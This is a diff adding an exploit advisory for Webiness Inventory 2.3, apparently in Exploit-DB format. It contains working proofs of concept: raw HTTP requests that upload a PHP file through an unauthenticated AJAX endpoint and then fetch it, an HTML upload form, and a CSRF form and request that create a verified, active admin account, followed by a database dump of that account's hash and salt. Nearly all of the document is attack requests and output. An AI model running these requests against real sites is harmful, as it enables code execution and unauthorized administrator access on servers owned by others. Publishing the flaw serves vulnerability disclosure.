@@ -1,0 +1,146 @@
+# Exploit Title: Webiness Inventory 2.3 - Arbitrary File Upload / Cross-Site Request Forgery Add Admin)
+# Dork: N/A
+# Date: 2018-11-11
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://github.com/webiness/webiness_inventory
+# Software Link: https://kent.dl.sourceforge.net/project/webinessinventory/2.3/webiness_inventory-2.3.zip
+# Version: 2.3
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/protected/library/ajax/WsSaveToModel.php
+# 
+# http://localhost/[PATH]/runtime/PartnerModel/[FILE]
+#  
+POST /[PATH]/protected/library/ajax/WsSaveToModel.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=
+---------------------------19855571512095910543502690828
+Content-Length: 384
+-----------------------------19855571512095910543502690828
+Content-Disposition: form-data; name="model_name"
+PartnerModel
+-----------------------------19855571512095910543502690828
+Content-Disposition: form-data; name="logo"; filename="phpinfo.php"
+Content-Type: application/force-download
+<?php
+phpinfo();
+?>
+-----------------------------19855571512095910543502690828--
+HTTP/1.1 200 OK
+Date: Sun, 11 Nov 2018 16:57:15 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Content-Length: 0
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# 
+GET /[PATH]/runtime/PartnerModel/phpinfo.php HTTP/1.1
+Host: 192.168.1.27
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Sun, 11 Nov 2018 16:58:27 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 2)
+# http://localhost/[PATH]/protected/library/ajax/WsSaveToModel.php
+# 
+# http://localhost/[PATH]/runtime/PartnerModel/[FILE]
+# 
+<html>
+<body>
+<form action="http://localhost/[PATH]/protected/library/ajax/WsSaveToModel.php" method="POST" enctype="multipart/form-data">
+<input name="model_name" value="PartnerModel" type="hidden">
+<input name="logo" type="file">
+<button type="submit">Ver Ayari</button>
+</form>
+</body>
+</html>
+
+# POC: 
+# 3)
+# http://localhost/[PATH]/protected/library/ajax/WsSaveToModel.php
+# 
+<html>
+<body>
+<form action="http://localhost/[PATH]/protected/library/ajax/WsSaveToModel.php" method="POST" enctype="multipart/form-data">
+<input name="model_name" value="Ws_userModel" type="hidden">
+<input name="id" value="3" placeholder="user_id" type="number">
+<input name="email" value="" placeholder="mail_address" type="text">
+<input name="password" value="" placeholder="password" type="password">
+<input name="user_salt" value="" type="hidden">
+<input name="verification_code" value="" type="hidden">
+<input value="false" name="is_verified" type="hidden"><input name="is_verified" value="true" data-val="true" class="" type="checkbox"> verified account?</label></div></div>
+<input value="false" name="is_active" type="hidden"><input name="is_active" value="true" data-val="true" class="" type="checkbox"> active account?</label>
+<button type="submit">Ver Ayari</button>
+</form>
+</body>
+</html>
+
+#
+POST /[PATH]/protected/library/ajax/WsSaveToModel.php HTTP/1.1
+Host: 192.168.1.27
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=
+---------------------------712753139516771986337452300
+Content-Length: 989
+-----------------------------712753139516771986337452300
+Content-Disposition: form-data; name="model_name"
+Ws_userModel
+-----------------------------712753139516771986337452300
+Content-Disposition: form-data; name="id"
+66
+-----------------------------712753139516771986337452300
+Content-Disposition: form-data; name="email"
+efe@omerefe.com
+-----------------------------712753139516771986337452300
+Content-Disposition: form-data; name="password"
+efe
+-----------------------------712753139516771986337452300
+Content-Disposition: form-data; name="user_salt"
+-----------------------------712753139516771986337452300
+Content-Disposition: form-data; name="is_verified"
+1
+-----------------------------712753139516771986337452300
+Content-Disposition: form-data; name="is_active"
+1
+-----------------------------712753139516771986337452300
+Content-Disposition: form-data; name="verification_code"
+-----------------------------712753139516771986337452300--
+HTTP/1.1 200 OK
+Date: Sun, 11 Nov 2018 17:19:11 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Content-Length: 0
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+/* `exploitdb`.`ws_user` */
+$ws_user = array(
+  array('id' => '66','email' => 'efe@omerefe.com','password' => 'f91f01637f051f2d44d6ee847e4bd339e7f89aab11ace6ab30c6c0af9d0f91fdcf90deb1e01a26320fe551c778c26ed57501f8cab4a026d3eaffbacdd3838794','user_salt' => '29tevoxs9n8lygh1w4xagv4j0w5w4q4ti3nokzsm0655zjl2ci','is_verified' => '1','is_active' => '1','verification_code' => '')
+);
